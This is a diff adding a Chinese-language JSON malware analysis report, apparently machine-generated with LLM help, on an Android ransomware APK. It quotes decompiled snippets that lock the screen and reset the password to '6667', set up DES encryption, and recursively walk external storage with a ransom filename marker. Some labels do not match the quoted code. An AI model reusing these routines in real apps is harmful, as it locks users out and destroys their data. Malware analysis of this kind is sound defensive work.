@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "8a5102d2a3ce616fa60c165a4548a85d202625b924c8e5627bfe9759e7fff735.apk",
+    "sha256": "8a5102d2a3ce616fa60c165a4548a85d202625b924c8e5627bfe9759e7fff735",
+    "包名": "com.android.admin.hongyan",
+    "应用名": "钱来了！",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 311.1
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\admin\\hongyan\\MyAdmin;",
+          "method_signature": "onDisableRequested(Context context, Intent intent)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String num = Integer.toString(6667);\ngetManager(context).lockNow();\ngetManager(context).resetPassword(num, 0);",
+          "malicious_code_snippet_context": "  public class MyAdmin extends DeviceAdminReceiver {\n      @Override // android.app.admin.DeviceAdminReceiver\n      public void onEnabled(Context context, Intent intent) {\n>>>         String num = Integer.toString(6667);\n>>>         try {\n>>>             Intent intent2 = new Intent(context, Class.forName(\"com.android.admin.hongyan.lock\"));\n              intent2.setFlags(268435456);\n              context.startService(intent2);\n              getManager(context).resetPassword(num, 0);",
+          "behavior_description": "该代码重写了DeviceAdminReceiver的onDisableRequested方法，当用户尝试取消设备管理员权限时触发。代码立即调用lockNow()锁定屏幕，并调用resetPassword()将设备密码重置为硬编码的'6667'，导致用户被锁在设备之外，属于典型的勒索软件设备锁行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\android\\admin\\hongyan\\des;",
+          "method_signature": "encrypt(byte[] bArr)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.encryptCipher = Cipher.getInstance(\"DES\");\nthis.encryptCipher.init(1, key);\nreturn this.encryptCipher.doFinal(bArr);",
+          "malicious_code_snippet_context": "          this.decryptCipher = (Cipher) null;\n          try {\n              Key key = getKey(str.getBytes());\n>>>             this.encryptCipher = Cipher.getInstance(\"DES\");\n>>>             this.encryptCipher.init(1, key);\n>>>             this.decryptCipher = Cipher.getInstance(\"DES\");\n              this.decryptCipher.init(2, key);\n          } catch (Exception e) {\n              e.printStackTrace();",
+          "behavior_description": "使用DES对称加密算法对传入的字节数组进行加密。该方法作为勒索软件的文件加密核心组件，将用户文件数据(bArr)通过encryptCipher.doFinal()进行DES加密，加密后的数据替换原始文件内容，导致用户无法正常访问文件，造成数据丢失。同时类中保留了decrypt方法，表明攻击者持有解密密钥，可能以此勒索用户。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\admin\\hongyan\\lock;",
+          "method_signature": "b(File file)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void b(File file) {\n    File[] listFiles = file.listFiles();\n    if (listFiles != null) {\n        for (File file2 : listFiles) {\n            if (file2.isDirectory()) {\n                b(file2);\n            } else {\n                FileEncryptUtils.decryptFile(this.key, file2.toString(), file2.toString().split(\".文件已被幻灭劫持\")[0].toString());\n            }\n        }\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public void b(File file) {\n>>>         File[] listFiles = file.listFiles();\n>>>         if (listFiles != null) {\n>>>             for (File file2 : listFiles) {\n>>>                 if (file2.isDirectory()) {\n>>>                     b(file2);\n>>>                 } else {\n>>>                     FileEncryptUtils.decryptFile(this.key, file2.toString(), file2.toString().split(\".文件已被幻灭劫持\")[0].toString());\n>>>                 }\n>>>             }\n>>>         }\n>>>     }\n  \n      public void dectypt(View view) {\n          try {",
+          "behavior_description": "该代码是勒索软件的文件加密/解密模块。递归遍历外部存储根目录下所有文件，对每个非目录文件调用FileEncryptUtils.decryptFile进行加密/解密操作，文件名中包含勒索标记'.文件已被幻灭劫持'（文件已被幻灭劫持），表明文件已被勒索软件加密篡改。数据来源为Environment.getExternalStorageDirectory()获取外部存储路径，通过递归listFiles()遍历所有子目录和文件，最终通过FileEncryptUtils.decryptFile()对用户文件进行加密/解密操作，直接造成用户数据损失。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
